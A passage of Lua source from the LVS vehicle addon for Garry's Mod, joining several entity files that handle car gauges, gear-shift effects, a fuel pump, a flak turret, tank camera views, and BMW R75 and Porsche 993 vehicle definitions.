	return CreateMaterial( name, "VertexLitGeneric", util.KeyValuesToTable( string_data ) )
end

function ENT:QuickLerp( name, target, rate )
	name =  "_smValue"..name

	if not self[ name ] then self[ name ] = 0 end

	self[ name ] = self[ name ] + (target - self[ name ]) * math.min( RealFrameTime() * (rate or 10), 1 )

	return self[ name ]
end

function ENT:CalcPoseParameters()
	local steer = self:GetSteer() /  self:GetMaxSteerAngle()

	local kmh = math.Round( self:GetVelocity():Length() * 0.09144, 0 )

	local lights = self:GetLightsHandler()
	local ammeter = 0.5

	local rpm = 0
	local oil = 0.25

	local gear = 1
	local clutch = 0

	local throttle = self:GetThrottle()

	local engine = self:GetEngine()
	local engineActive = self:GetEngineActive()

	local fuel = 1
	local fueltank = self:GetFuelTank()

	local handbrake = self:QuickLerp( "handbrake", self:GetNWHandBrake() and 1 or 0 )

	local temperature = 0

	if IsValid( engine ) then
		rpm = self:QuickLerp( "rpm", engine:GetRPM() )
		gear = engine:GetGear()
		oil = self:QuickLerp( "oil", engineActive and math.min( 0.2 + (rpm / self.EngineMaxRPM) * 1.25, 1 ) or 0, 0.1 ) ^ 2

		local ClutchActive = engine:GetClutch()

		clutch = self:QuickLerp( "clutch", ClutchActive and 1 or 0 )

		if ClutchActive then
			throttle = math.max( throttle - clutch, 0 )
		end

		temperature = self:QuickLerp( "temp", self:QuickLerp( "base_temp", engineActive and 0.5 or 0, 0.025 + throttle * 0.1 ) + (1 - engine:GetHP() / engine:GetMaxHP()) ^ 2 * 1.25, 0.5 )
	else
		temperature = self:QuickLerp( "temp", self:QuickLerp( "base_temp", engineActive and 0.5 or 0, 0.025 + throttle * 0.1 ) + (1 - self:GetHP() / self:GetMaxHP()) ^ 2 * 1.25, 0.5 )
	end

	if IsValid( lights ) then
		local Available = 0.5 + (rpm / self.EngineMaxRPM) * 0.25

		local Use1 = lights:GetActive() and 0.1 or 0
		local Use2 = lights:GetHighActive() and 0.15 or 0
		local Use3 = lights:GetFogActive() and 0.05 or 0
		local Use4 = (self:GetTurnMode() ~= 0 and  self:GetTurnFlasher()) and 0.03 or 0

		ammeter = self:QuickLerp( "ammeter", math.max( Available - Use1 - Use2 - Use3 - Use4, 0 ), math.Rand(1,10) )
	end

	if IsValid( fueltank ) then
		fuel = self:QuickLerp( "fuel", fueltank:GetFuel() )
	end

	self:UpdatePoseParameters( steer, self:QuickLerp( "kmh", kmh ), rpm, throttle, self:GetBrake(), handbrake, clutch, (self:GetReverse() and -gear or gear), temperature, fuel, oil, ammeter )
	self:InvalidateBoneCache()
end

function ENT:Think()
	if not self:IsInitialized() then return end

	BaseClass.Think( self )

	self:TireSoundThink()
	self:ExhaustEffectsThink()

	if isfunction( self.UpdatePoseParameters ) then
		self:CalcPoseParameters()
	else
		self:SetPoseParameter( "vehicle_steer", self:GetSteer() /  self:GetMaxSteerAngle() )
		self:InvalidateBoneCache()
	end
 end
 
function ENT:OnRemove()
	self:TireSoundRemove()

	BaseClass.OnRemove( self )
end

function ENT:PostDrawTranslucent()
	local Handler = self:GetLightsHandler()

	if not IsValid( Handler ) or not istable( self.Lights ) then return end

	Handler:RenderLights( self, self.Lights )
end

function ENT:OnEngineStallBroken()
	for i = 0,math.random(3,6) do
		timer.Simple( math.Rand(0,1.5) , function()
			if not IsValid( self ) then return end

			self:DoExhaustBackFire()
		end )
	end
end

function ENT:OnChangeGear( oldGear, newGear )
	local HP = self:GetHP()
	local MaxHP = self:GetMaxHP()

	local Engine = self:GetEngine()
	local EngineHP = 0
	local EngineMaxHP = 0

	if IsValid( Engine ) then
		EngineHP = Engine:GetHP()
		EngineMaxHP = Engine:GetMaxHP()
	end

	local Damaged = HP < MaxHP * 0.5
	local EngineDamaged = EngineHP < EngineMaxHP * 0.5

	if (Damaged or EngineDamaged) then
		if oldGear > newGear then
			if Damaged then
				self:EmitSound( "lvs/vehicles/generic/gear_grind"..math.random(1,6)..".ogg", 75, math.Rand(70,100), 0.25 )
				self:DoExhaustBackFire()
			end
		else
			if EngineDamaged then
				self:DoExhaustBackFire()
			end
		end
	else
		self:EmitSound( self.TransShiftSound, 75 )

		if self:IsBackFireEnabled() then
			self:CalcExhaustPop()
		end
	end

	self:SuppressViewPunch( self.TransShiftSpeed )
end

function ENT:GetTurnFlasher()
	return math.cos( CurTime() * 8 + self:EntIndex() * 1337 ) > 0
end

function ENT:OnEngineActiveChanged( Active )
	if Active then
		self:EmitSound( "lvs/vehicles/generic/engine_start1.wav", 75, 100, LVS.EngineVolume )
	else
		self:EmitSound( "vehicles/jetski/jetski_off.wav", 75, 100, LVS.EngineVolume )
	end
end

function ENT:GetWheels()
	local wheels = {}

	for _, ent in pairs( self:GetCrosshairFilterEnts() ) do
		if not IsValid( ent ) or ent:GetClass() ~= "lvs_wheeldrive_wheel" then continue end

		table.insert( wheels, ent )
	end

	return wheels
end
--PATH addons/lvs_cars_3027255911/lua/entities/lvs_base_wheeldrive/cl_flyby.lua:

ENT.FlyByVelocity = 500
ENT.FlyByMinThrottle = 0
ENT.FlyByAdvance = 1
ENT.FlyBySound = "lvs/vehicles/generic/car_flyby.wav"

function ENT:FlyByThink()
	local ply = LocalPlayer()

	if not IsValid( ply ) then return end

	local veh = ply:lvsGetVehicle()

	local EntTable = self:GetTable()

	if veh == self then EntTable.OldApproaching = false return end

	local ViewEnt = ply:GetViewEntity()

	if not IsValid( ViewEnt ) then return end

	if IsValid( veh ) and ViewEnt == ply then
		ViewEnt = veh
	end

	local Time = CurTime()

	if (EntTable._nextflyby or 0) > Time then return end

	EntTable._nextflyby = Time + 0.1

	local Vel = self:GetVelocity()

	if self:GetThrottle() <= EntTable.FlyByMinThrottle or Vel:Length() <= EntTable.FlyByVelocity then return end

	local Sub = ViewEnt:GetPos() - self:GetPos() - Vel * EntTable.FlyByAdvance
	local ToPlayer = Sub:GetNormalized()
	local VelDir = Vel:GetNormalized()

	local ApproachAngle = self:AngleBetweenNormal( ToPlayer, VelDir  )

	local Approaching = ApproachAngle < 80

	if Approaching ~= EntTable.OldApproaching then
		EntTable.OldApproaching = Approaching

		if Approaching then
			self:StopFlyBy()
		else
			self:OnFlyBy( 60 + 80 * math.min(ApproachAngle / 140,1) )
		end
	end
end

function ENT:OnFlyBy( Pitch )
	if not self.FlyBySound then return end

	local EntTable = self:GetTable()

	EntTable.flybysnd = CreateSound( self, EntTable.FlyBySound )
	EntTable.flybysnd:SetSoundLevel( 95 )
	EntTable.flybysnd:PlayEx( 1, Pitch )
end

function ENT:StopFlyBy()
	local EntTable = self:GetTable()

	if not EntTable.flybysnd then return end

	EntTable.flybysnd:Stop()
	EntTable.flybysnd = nil
end
--PATH addons/lvs_cars_3027255911/lua/entities/lvs_item_refuel.lua:
AddCSLuaFile()

ENT.Type            = "anim"

ENT.PrintName = "Gas Station"
ENT.Author = "Luna"
ENT.Information = "Refills fuel tanks"
ENT.Category = "[LVS]"

ENT.Spawnable		= true
ENT.AdminOnly		= false

ENT.Editable = true

function ENT:SetupDataTables()
	self:NetworkVar( "Entity",0, "User" )
	self:NetworkVar( "Int",0, "FuelType", { KeyName = "fueltype", Edit = { type = "Int", order = 1,min = 0, max = #LVS.FUELTYPES, category = "Settings"} } )

	if SERVER then
		self:SetFuelType( LVS.FUELTYPE_PETROL )
	end
end

if SERVER then
	function ENT:SpawnFunction( ply, tr, ClassName )
		if not tr.Hit then return end

		local ent = ents.Create( ClassName )
		ent:SetPos( tr.HitPos + tr.HitNormal )
		ent:Spawn()
		ent:Activate()

		return ent
	end

	function ENT:OnTakeDamage( dmginfo )
	end

	function ENT:Initialize()	
		self:SetModel( "models/props_wasteland/gaspump001a.mdl" )
		self:PhysicsInit( SOLID_VPHYSICS )
		self:SetUseType( SIMPLE_USE )

		local PhysObj = self:GetPhysicsObject()

		if not IsValid( PhysObj ) then return end

		PhysObj:EnableMotion( false )
	end

	function ENT:giveSWEP( ply )
		self:EmitSound("common/wpn_select.wav")

		ply:SetSuppressPickupNotices( true )
		ply:Give( "weapon_lvsfuelfiller" )
		ply:SetSuppressPickupNotices( false )

		ply:SelectWeapon( "weapon_lvsfuelfiller" )
		self:SetUser( ply )

		local SWEP = ply:GetWeapon( "weapon_lvsfuelfiller" )
	
		if not IsValid( SWEP ) then return end

		SWEP:SetFuelType( self:GetFuelType() )
		SWEP:SetCallbackTarget( self )
	end

	function ENT:removeSWEP( ply )
		if ply:HasWeapon( "weapon_lvsfuelfiller" ) then
			ply:StripWeapon( "weapon_lvsfuelfiller" )
			ply:SwitchToDefaultWeapon()
		end
		self:SetUser( NULL )
	end

	function ENT:checkSWEP( ply )
		if not ply:Alive() or ply:InVehicle() then

			self:removeSWEP( ply )

			return
		end

		local weapon = ply:GetActiveWeapon()

		if not IsValid( weapon ) or weapon:GetClass() ~= "weapon_lvsfuelfiller" then
			self:removeSWEP( ply )

			return
		end

		if (ply:GetPos() - self:GetPos()):LengthSqr() < 150000 then return end

		self:removeSWEP( ply )
	end

	function ENT:Think()
		local ply = self:GetUser()
		local T = CurTime()

		if IsValid( ply ) then
			self:checkSWEP( ply )

			self:NextThink( T )
		else
			self:NextThink( T + 0.5 )
		end

		return true
	end

	function ENT:Use( ply )
		if not IsValid( ply ) or not ply:IsPlayer() then return end

		local User = self:GetUser()

		if IsValid( User ) then
			if User == ply then
				self:removeSWEP( ply )
			end
		else
			if ply:HasWeapon("weapon_lvsfuelfiller") then return end

			self:giveSWEP( ply )
		end
	end

	function ENT:OnRemove()
		local User = self:GetUser()

		if not IsValid( User ) then return end

		self:removeSWEP( User )
	end
end

if CLIENT then
	function ENT:CreatePumpEnt()
		if IsValid( self.PumpEnt ) then return self.PumpEnt end

		self.PumpEnt = ents.CreateClientProp()
		self.PumpEnt:SetModel( "models/props_equipment/gas_pump_p13.mdl" )
		self.PumpEnt:SetPos( self:LocalToWorld( Vector(-0.2,-14.6,45.7) ) )
		self.PumpEnt:SetAngles( self:LocalToWorldAngles( Angle(-0.3,92.3,-0.1) ) )
		self.PumpEnt:Spawn()
		self.PumpEnt:Activate()
		self.PumpEnt:SetParent( self )

		return self.PumpEnt
	end

	function ENT:RemovePumpEnt()
		if not IsValid( self.PumpEnt ) then return end

		self.PumpEnt:Remove()
	end

	function ENT:Think()
		local PumpEnt = self:CreatePumpEnt()

		local ShouldDraw = IsValid( self:GetUser() )
		local Draw = PumpEnt:GetNoDraw()

		if Draw ~= ShouldDraw then
			PumpEnt:SetNoDraw( ShouldDraw )
		end
	end

	local cable = Material( "cable/cable2" )
	local function bezier(p0, p1, p2, p3, t)
		local e = p0 + t * (p1 - p0)
		local f = p1 + t * (p2 - p1)
		local g = p2 + t * (p3 - p2)

		local h = e + t * (f - e)
		local i = f + t * (g - f)

		local p = h + t * (i - h)

		return p
	end

	ENT.FrameMat = Material( "lvs/3d2dmats/frame.png" )
	ENT.RefuelMat = Material( "lvs/3d2dmats/refuel.png" )

	function ENT:Draw()
		self:DrawModel()
		self:DrawCable()

		local ply = LocalPlayer()
		local Pos = self:GetPos()

		if not IsValid( ply ) then return end

		if (ply:GetPos() - Pos):LengthSqr() > 5000000 then return end

		local data = LVS.FUELTYPES[ self:GetFuelType() ]
		local Text = data.name
		local IconColor = Color( data.color.x, data.color.y, data.color.z, 255 )

		cam.Start3D2D( self:LocalToWorld( Vector(10,0,45) ), self:LocalToWorldAngles( Angle(0,90,90) ), 0.1 )
			draw.NoTexture()
			surface.SetDrawColor( 0, 0, 0, 255 )
			surface.DrawRect( -150, -120, 300, 240 )

			surface.SetDrawColor( IconColor )

			surface.SetMaterial( self.FrameMat )
			surface.DrawTexturedRect( -50, -50, 100, 100 )

			surface.SetMaterial( self.RefuelMat )
			surface.DrawTexturedRect( -50, -50, 100, 100 )

			draw.SimpleText( Text, "LVS_FONT", 0, 75, IconColor, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
		cam.End3D2D()
	end

	function ENT:DrawCable()
		local plyL = LocalPlayer()

		if not IsValid( plyL ) then return end

		if plyL:GetPos():DistToSqr( self:GetPos() ) > 350000 then return end

		local pos = self:LocalToWorld( Vector(10,0,45) )
		local ang = self:LocalToWorldAngles( Angle(0,90,90) )
		local ply = self:GetUser()

		local startPos = self:LocalToWorld( Vector(0.06,-17.77,55.48) )
		local p2 = self:LocalToWorld( Vector(8,-17.77,30) )
		local p3
		local endPos

		if IsValid( ply ) then
			local id = ply:LookupAttachment("anim_attachment_rh")
			local attachment = ply:GetAttachment( id )

			if not attachment then return end

			endPos = (attachment.Pos + attachment.Ang:Forward() * -3 + attachment.Ang:Right() * 2 + attachment.Ang:Up() * -3.5)
			p3 = endPos + attachment.Ang:Right() * 5 - attachment.Ang:Up() * 20
		else
			p3 = self:LocalToWorld( Vector(0,-20,30) )
			endPos = self:LocalToWorld( Vector(0.06,-20.3,37) )
		end

		render.StartBeam( 15 )
		render.SetMaterial( cable )

		for i = 0,15 do
			local pos = bezier(startPos, p2, p3, endPos, i / 14)

			local Col = (render.GetLightColor( pos ) * 0.8 + Vector(0.2,0.2,0.2)) * 255

			render.AddBeam( pos, 1, 0, Color(Col.r,Col.g,Col.b,255) )
		end

		render.EndBeam()
	end

	function ENT:OnRemove()
		self:RemovePumpEnt()
	end
end
--PATH addons/lvs_cars_3027255911/lua/entities/lvs_trailer_flak/sh_turret.lua:

include("entities/lvs_tank_wheeldrive/modules/sh_turret.lua")

ENT.TurretFakeBarrel = true
ENT.TurretFakeBarrelRotationCenter =  Vector(0,0,40)

ENT.TurretAimRate = 80

ENT.TurretRotationSound = "common/null.wav"

ENT.TurretPitchPoseParameterName = "cannon_pitch"
ENT.TurretPitchMin = -30
ENT.TurretPitchMax = 90
ENT.TurretPitchMul = 1
ENT.TurretPitchOffset = 0

ENT.TurretYawPoseParameterName = "cannon_yaw"
ENT.TurretYawMul = -1
ENT.TurretYawOffset = 180

function ENT:TurretInRange()
	local ID = self:LookupAttachment( "muzzle" )

	local Muzzle = self:GetAttachment( ID )

	if not Muzzle then return true end

	local Dir1 = Muzzle.Ang:Forward()
	local Dir2 = self:GetAimVector() 

	return self:AngleBetweenNormal( Dir1, Dir2 ) < 5
end
--PATH addons/lvs_cars_3027255911/lua/entities/lvs_tank_wheeldrive/modules/cl_attachable_playermodels.lua:
if SERVER then return end

function ENT:GetPlayerModel( name )
	if not istable( self._PlayerModels ) then return end

	return self._PlayerModels[ name ]
end

function ENT:RemovePlayerModel( name )
	if not istable( self._PlayerModels ) then return end

	for id, model in pairs( self._PlayerModels ) do
		if name and id ~= name then continue end

		if not IsValid( model ) then continue end

		model:Remove()
	end
end

function ENT:CreatePlayerModel( ply, name )
	if not isstring( name ) then return end

	if not istable( self._PlayerModels ) then
		self._PlayerModels  = {}
	end

	if IsValid( self._PlayerModels[ name ] ) then return self._PlayerModels[ name ] end

	local model = ClientsideModel( ply:GetModel() )
	model:SetNoDraw( true )

	model.GetPlayerColor = function() return ply:GetPlayerColor() end
	model:SetSkin( ply:GetSkin() )

	self._PlayerModels[ name ] = model

	return model
end

function ENT:OnRemoved()
	self:RemovePlayerModel()
end
--PATH addons/lvs_cars_3027255911/lua/entities/lvs_tank_wheeldrive/modules/cl_tankview.lua:
if SERVER then return end

function ENT:TankViewOverride( ply, pos, angles, fov, pod )
	return pos, angles, fov
end

function ENT:CalcTankView( ply, original_pos, original_ang, original_fov, pod )
	local pos, angles, fov = self:TankViewOverride( ply, original_pos, original_ang, original_fov, pod )

	local view = {}
	view.origin = pos
	view.angles = angles
	view.fov = fov
	view.drawviewer = false

	if not pod:GetThirdPersonMode() then return view end

	local mn = self:OBBMins()
	local mx = self:OBBMaxs()
	local radius = ( mn - mx ):Length()
	local radius = radius + radius * pod:GetCameraDistance()

	local clamped_angles = pod:WorldToLocalAngles( angles )
	clamped_angles.p = math.max( clamped_angles.p, -20 )
	clamped_angles = pod:LocalToWorldAngles( clamped_angles )

	local StartPos = pos
	local EndPos = StartPos - clamped_angles:Forward() * radius + clamped_angles:Up() * (radius * pod:GetCameraHeight())

	local WallOffset = 4

	local tr = util.TraceHull( {
		start = StartPos,
		endpos = EndPos,
		filter = function( e )
			local c = e:GetClass()
			local collide = not c:StartWith( "prop_physics" ) and not c:StartWith( "prop_dynamic" ) and not c:StartWith( "prop_ragdoll" ) and not e:IsVehicle() and not c:StartWith( "gmod_" ) and not c:StartWith( "lvs_" ) and not c:StartWith( "player" ) and not e.LVS

			return collide
		end,
		mins = Vector( -WallOffset, -WallOffset, -WallOffset ),
		maxs = Vector( WallOffset, WallOffset, WallOffset ),
	} )

	view.angles = angles + Angle(5,0,0)
	view.origin = tr.HitPos + pod:GetUp() * 65
	view.drawviewer = true

	if tr.Hit and  not tr.StartSolid then
		view.origin = view.origin + tr.HitNormal * WallOffset
	end

	return view
end

function ENT:CalcViewDirectInput( ply, pos, angles, fov, pod )
	if not pod:GetThirdPersonMode() then
		angles = pod:LocalToWorldAngles( ply:EyeAngles() )
	end

	return self:CalcTankView( ply, pos, angles, fov, pod )
end

function ENT:CalcViewMouseAim( ply, pos, angles, fov, pod )
	return self:CalcTankView( ply, pos, angles, fov, pod )
end

function ENT:CalcViewPassenger( ply, pos, angles, fov, pod )
	if not pod:GetThirdPersonMode() then
		angles = pod:LocalToWorldAngles( ply:EyeAngles() )
	end

	return self:CalcTankView( ply, pos, angles, fov, pod )
end

--PATH addons/lvs_cars_3027255911/lua/entities/lvs_wheeldrive_bmw_r75/cl_init.lua:
include("shared.lua")

function ENT:UpdatePoseParameters( steer )
	self:SetPoseParameter( "vehicle_steer", steer )
	self:SetPoseParameter( "kickstart", self:GetKickStarter() )
end

function ENT:OnEngineActiveChanged( Active )
	if Active then
		self:EmitSound( "lvs/vehicles/bmw_r75/eng_start.wav", 75, 100,  LVS.EngineVolume )

		return
	end

	self:EmitSound( "lvs/vehicles/bmw_r75/eng_stop.wav", 75, 100,  LVS.EngineVolume )
end
--PATH addons/lvs_cars_3027255911/lua/entities/lvs_wheeldrive_bmw_r75/shared.lua:

ENT.Base = "lvs_bike_wheeldrive"

ENT.PrintName = "BMW R75"
ENT.Author = "Digger"
ENT.Information = "Luna's Vehicle Script"
ENT.Category = "[LVS] - Cars"

ENT.VehicleCategory = "Cars"
ENT.VehicleSubCategory = "Military"

ENT.Spawnable			= true
ENT.AdminSpawnable		= false

ENT.MDL = "models/diggercars/bmw_r75/r75_bike.mdl"

ENT.AITEAM = 1

ENT.MaxHealth = 500

ENT.MaxVelocity = 1250
ENT.MaxVelocityReverse = 100

ENT.EngineCurve = 0.4
ENT.EngineTorque = 250

ENT.TransGears = 4
ENT.TransGearsReverse = 1

ENT.lvsShowInSpawner = true

ENT.KickStarter = true
ENT.KickStarterSound = "lvs/vehicles/bmw_r75/moped_crank.wav"
ENT.KickStarterMinAttempts = 2
ENT.KickStarterMaxAttempts = 4
ENT.KickStarterAttemptsInSeconds = 5

ENT.DriverBoneManipulateIdle = {
	["ValveBiped.Bip01_L_Thigh"] = Angle(-25,45,0),
	["ValveBiped.Bip01_L_Calf"] = Angle(0,-30,0),
	["ValveBiped.Bip01_L_Foot"] = Angle(0,0,0),
}

ENT.DriverBoneManipulateParked = {
	["ValveBiped.Bip01_R_Thigh"] = Angle(25,45,0),
	["ValveBiped.Bip01_R_Calf"] = Angle(0,-30,0),
	["ValveBiped.Bip01_R_Foot"] = Angle(0,0,0),
}

ENT.DriverBoneManipulateKickStart = {
	Start = {
		["ValveBiped.Bip01_L_Thigh"] = Angle(-20,60,25),
		["ValveBiped.Bip01_L_Calf"] = Angle(0,0,0),
		["ValveBiped.Bip01_L_Foot"] = Angle(0,-10,0),
	},
	End = {
		["ValveBiped.Bip01_L_Thigh"] = Angle(-20,-10,25),
		["ValveBiped.Bip01_L_Calf"] = Angle(0,70,0),
		["ValveBiped.Bip01_L_Foot"] = Angle(0,-10,0),
	},
}

ENT.PlayerBoneManipulate = {
	[1] = {
		["ValveBiped.Bip01_Pelvis"] = Angle(0,0,23),
		
		["ValveBiped.Bip01_R_Thigh"] = Angle(14,10,-5),
		["ValveBiped.Bip01_L_Thigh"] = Angle(-14,10,5),

		["ValveBiped.Bip01_R_Calf"] = Angle(0,40,0),
		["ValveBiped.Bip01_L_Calf"] = Angle(0,40,0),
		
		["ValveBiped.Bip01_R_Foot"] = Angle(0,-20,0),
		["ValveBiped.Bip01_L_Foot"] = Angle(0,-20,0),

		["ValveBiped.Bip01_R_UpperArm"] = Angle(10,25,0),
		["ValveBiped.Bip01_L_UpperArm"] = Angle(-5,25,0),

		["ValveBiped.Bip01_R_Forearm"] = Angle(0,-10,0),
		["ValveBiped.Bip01_L_Forearm"] = Angle(0,-10,0),
	},
	[2] = {
		["ValveBiped.Bip01_R_Thigh"] = Angle(14,10,0),
		["ValveBiped.Bip01_L_Thigh"] = Angle(-14,10,0),
	},
}

ENT.EngineSounds = {
	{
		sound = "lvs/vehicles/bmw_r75/eng_idle.wav",
		Volume = 0.7,
		Pitch = 85,
		PitchMul = 50,
		SoundLevel = 75,
		SoundType = LVS.SOUNDTYPE_IDLE_ONLY,
	},
	{
		sound = "lvs/vehicles/bmw_r75/eng_loop.wav",
		Volume = 1,
		Pitch = 50,
		PitchMul = 50,
		SoundLevel = 75,
		UseDoppler = true,
	},
}

ENT.Lights = {
	{
		Trigger = "main+high",
		SubMaterialID = 0,
		Sprites = {
			{ pos = "lamp", colorB = 200, colorA = 150 },
		},
	},
	{
		Trigger = "main",
		Sprites = {
			{ pos = "back1", colorG = 0, colorB = 0, colorA = 150, width = 10, height = 10 },
		},
		ProjectedTextures = {
			{ pos = "lamp", ang = Angle(0,0,0), colorB = 200, colorA = 150, shadows = true },
		},
	},
	{
		Trigger = "high",
		ProjectedTextures = {
			{ pos = "lamp", ang = Angle(0,0,0), colorB = 200, colorA = 150, shadows = true },
		},
	},
	{
		Trigger = "main",
		SubMaterialID = 4,
	},
	{
		Trigger = "brake",
		SubMaterialBrightness = 1,
		Sprites = {
			{ pos = "back1", colorG = 0, colorB = 0, colorA = 150, width = 20, height = 20 },
		},
	},
}

ENT.ExhaustPositions = {
	{
		pos = Vector(-38.43,-5,16),
		ang = Angle(0,180,0),
	},
}

--PATH addons/lvs_cars_3027255911/lua/entities/lvs_wheeldrive_destruction.lua:
AddCSLuaFile()

ENT.Type            = "anim"

if SERVER then
	function ENT:Initialize()
		self:PhysicsInit( SOLID_VPHYSICS )
		self:SetMoveType( MOVETYPE_NONE )
		self:SetSolid( SOLID_NONE )
		self:DrawShadow( false ) 

		self.Vel = isvector( self.Vel ) and self.Vel or Vector(0,0,0)

		local fxPos = self:LocalToWorld( self:OBBCenter() )
	
		local effectdata = EffectData()
			effectdata:SetOrigin( fxPos )
		util.Effect( "lvs_explosion_bomb", effectdata )

		self.Gibs = {}

		if not istable( self.GibModels ) then return end

		local Speed = self.Vel:Length()

		for _, v in pairs( self.GibModels ) do
			local ent = ents.Create( "prop_physics" )

			if not IsValid( ent ) then continue end

			table.insert( self.Gibs, ent ) 

			ent:SetPos( self:GetPos() )
			ent:SetAngles( self:GetAngles() )
			ent:SetModel( v )
			ent:Spawn()
			ent:Activate()
			ent:SetCollisionGroup( COLLISION_GROUP_DEBRIS )

			local PhysObj = ent:GetPhysicsObject()
			if IsValid( PhysObj ) then
				if Speed <= 250 then
					local GibDir = Vector( math.Rand(-1,1), math.Rand(-1,1), 1.5 ):GetNormalized()
					PhysObj:SetVelocityInstantaneous( GibDir * math.random(800,1300)  )
				else
					PhysObj:SetVelocityInstantaneous( VectorRand() * math.max(300,self.Vel:Length() / 3) + self.Vel  )
				end

				PhysObj:AddAngleVelocity( VectorRand() * 500 ) 
				PhysObj:EnableDrag( false ) 

				local effectdata = EffectData()
					effectdata:SetOrigin( fxPos )
					effectdata:SetStart( PhysObj:GetMassCenter() )
					effectdata:SetEntity( ent )
					effectdata:SetScale( math.Rand(0.3,0.7) )
					effectdata:SetMagnitude( math.Rand(0.5,2.5) )
				util.Effect( "lvs_firetrail", effectdata )
			end
		end
	end

	function ENT:Think()
		return false
	end

	function ENT:OnRemove()
		if istable( self.Gibs ) then
			for _, v in pairs( self.Gibs ) do
				if IsValid( v ) then
					v:Remove()
				end
			end
		end
	end
else
	function ENT:Draw()
	end
end
--PATH addons/lvs_cars_3027255911/lua/entities/lvs_wheeldrive_engine_swapped.lua:
AddCSLuaFile()

ENT.Base = "lvs_wheeldrive_engine"
DEFINE_BASECLASS( "lvs_wheeldrive_engine" )

ENT.DoNotDuplicate = true

ENT._LVS = true

ENT.lvsEngine = true

if SERVER then
	util.AddNetworkString( "lvs_engine_swap" )

	net.Receive("lvs_engine_swap", function( len, ply )
		local ent = net.ReadEntity()

		if not IsValid( ent ) or not ent.lvsEngine then return end

		if not istable( ent.EngineSounds ) then return end

		net.Start("lvs_engine_swap")
			net.WriteEntity( ent )
			net.WriteTable( ent.EngineSounds )
		net.Send( ply )
	end)
else
	net.Receive("lvs_engine_swap", function( len )
		local ent = net.ReadEntity()

		if not IsValid( ent ) then return end

		ent.EngineSounds = net.ReadTable()
	end)

	function ENT:Think()
		local vehicle = self:GetBase()

		if not IsValid( vehicle ) then return end

		self:DamageFX( vehicle )

		if not self.EngineSounds then
			self.EngineSounds = {}

			net.Start("lvs_engine_swap")
				net.WriteEntity( self )
			net.SendToServer()

			return
		end

		local EngineActive = vehicle:GetEngineActive()

		if self._oldEnActive ~= EngineActive then
			self._oldEnActive = EngineActive

			self:OnEngineActiveChanged( EngineActive )
		end

		if EngineActive then
			self:HandleEngineSounds( vehicle )
			self:ExhaustFX( vehicle )
		end
	end
end
--PATH addons/lvs_cars_3027255911/lua/entities/lvs_wheeldrive_porsche993turbo/cl_init.lua:
include("shared.lua")


function ENT:UpdatePoseParameters( steer, speed_kmh, engine_rpm, throttle, brake, handbrake, clutch, gear, temperature, fuel, oil, ammeter )
	self:SetPoseParameter( "vehicle_steer", steer )
	self:SetPoseParameter( "tacho_gauge", engine_rpm / 8000 )
	self:SetPoseParameter( "temp_gauge", temperature )
	self:SetPoseParameter( "fuel_gauge", fuel )
	self:SetPoseParameter( "oil_gauge", oil )
	self:SetPoseParameter( "vehicle_gauge", speed_kmh / 400 )

	local GearIDtoPose = {
		[-1] = 0,
		[1] = 3,
		[2] = 5,
		[3] = 8,
		[4] = 10,
		[5] = 13,
		[6] = 15,
	}

	self:SetPoseParameter( "gear",  self:QuickLerp( "gear", (GearIDtoPose[ gear ] or 1) ) )

	local hours = os.date( "%H" )
	local min = os.date( "%M" ) 
	local sec = os.date( "%S" )

	self:SetPoseParameter( "hour", hours + min / 60 )
	self:SetPoseParameter( "minute", min + sec / 60 )
	self:SetPoseParameter( "second", sec )

end
--PATH addons/lvs_cars_3027255911/lua/entities/lvs_wheeldrive_porsche993turbo/shared.lua:

ENT.Base = "lvs_base_wheeldrive"

ENT.PrintName = "Porsche 911(993) Turbo"
ENT.Author = "Digger"
ENT.Information = "Luna's Vehicle Script"
ENT.Category = "[LVS] - Cars - Pack"

ENT.VehicleCategory = "Cars"
ENT.VehicleSubCategory = "Civilian"

ENT.Spawnable			= true
ENT.AdminSpawnable		= false

ENT.MDL = "models/diggercars/porsche_993/carrera.mdl"

ENT.MaxVelocity = 3000

ENT.EngineCurve = 0.8
ENT.EngineTorque = 60

ENT.EngineIdleRPM = 700
ENT.EngineMaxRPM = 8000

ENT.TransGears = 6
ENT.TransGearsReverse = 1

ENT.PhysicsMass = 700
ENT.PhysicsInertia = Vector(1050,1050,525)

ENT.WheelPhysicsMass = 150
ENT.WheelPhysicsInertia = Vector(15,12,15)

ENT.RandomColor = {

	{
		Skin = 0,
		Color = Color(240,240,240),
		BodyGroups = {
			[6] = 3,
		},
	},
	{
		Skin = 0,
		Color = Color(140,0,0),
		BodyGroups = {
			[6] = 3,
		},
	},
	{
		Skin = 0,
		Color = Color(255,191,0),
		BodyGroups = {
			[6] = 3,
		},
	},
	{
		Skin = 0,
		Color = Color(54,110,91),
		BodyGroups = {
			[6] = 3,
		},
	},
	{
		Skin = 0,
		Color = Color(100,100,100),
		BodyGroups = {
			[6] = 3,
		},
	},
	{
		Skin = 0,
		Color = Color(181,159,85),
		BodyGroups = {
			[6] = 3,
		},
	},
	{
		Skin = 0,
		Color = Color(28,68,190),
		BodyGroups = {
			[6] = 3,
		},
	},
}



ENT.HornSound = "lvs/horn1.wav"
ENT.HornPos = Vector(40,0,35)

ENT.EngineSounds = {
	{
		sound = "lvs/vehicles/boxer6/eng_idle_loop.wav",
		Volume = 1,
		Pitch = 55,
		PitchMul = 30,
		SoundLevel = 75,
		SoundType = LVS.SOUNDTYPE_IDLE_ONLY,
	},
	{
		sound = "lvs/vehicles/boxer6/eng_loop.wav",
		Volume = 1,
		Pitch = 50,
		PitchMul = 80,
		SoundLevel = 75,
		SoundType = LVS.SOUNDTYPE_REV_UP,
		UseDoppler = true,
	},
	{
		sound = "lvs/vehicles/boxer6/eng_revdown_loop.wav",
		Volume = 1,
		Pitch = 50,
		PitchMul = 80,
		SoundLevel = 75,
		SoundType = LVS.SOUNDTYPE_REV_DOWN,
		UseDoppler = true,
	},
}

ENT.ExhaustPositions = {
	{
		pos = Vector(-83.53,21.46,3.75),
		ang = Angle(0,180,0),
	},
	{
		pos = Vector(-83.53,-21.46,3.75),
		ang = Angle(0,180,0),
	}
}

ENT.Lights = {
	{
		Trigger = "main",
		SubMaterialID = 23,
		Sprites = {
			{ pos = Vector(68.69,23.38,21.31), colorB = 200, colorA = 150 },
			{ pos = Vector(68.69,-23.38,21.31), colorB = 200, colorA = 150 },
		},
		ProjectedTextures = {
			{ pos = Vector(68.69,23.38,21.31), ang = Angle(0,0,0), colorB = 200, colorA = 150, shadows = true },
